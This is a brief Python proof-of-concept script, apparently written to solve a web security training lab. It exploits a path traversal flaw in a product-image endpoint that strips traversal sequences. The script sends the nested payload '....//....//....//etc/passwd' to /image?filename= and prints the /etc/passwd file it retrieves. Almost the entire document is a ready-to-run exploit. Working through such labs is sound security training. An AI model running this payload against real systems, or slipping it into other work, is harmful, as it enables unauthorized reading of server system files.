# This lab contains a path traversal vulnerability in the display of product images.
# The application strips path traversal sequences from the user-supplied filename before using it.
# To solve the lab, retrieve the contents of the /etc/passwd file.
# PoC Script Credit to SamH

import requests 
import sys


def check_url(raw_url):
    return raw_url.rstrip('/')


args = sys.argv[1:]

try:
    raw_url = args[0]
    base_url = check_url(raw_url)
except:
    print("[!] Error\nUsage: python3 lab-simple.py <lab_url>")

vuln_url = base_url + "/image?filename="
payload = "....//....//....//etc/passwd"

try:
    response = requests.get(vuln_url + payload)
    if response.status_code == 200:
        print("[+] Done!")
        print("[+] /etc/passwd")
        print(response.content)
    else:
        print(response.status_code)
        print(response.content)
except:
    print("[!] Error\nUsage: python3 lab-simple.py <lab_url>")


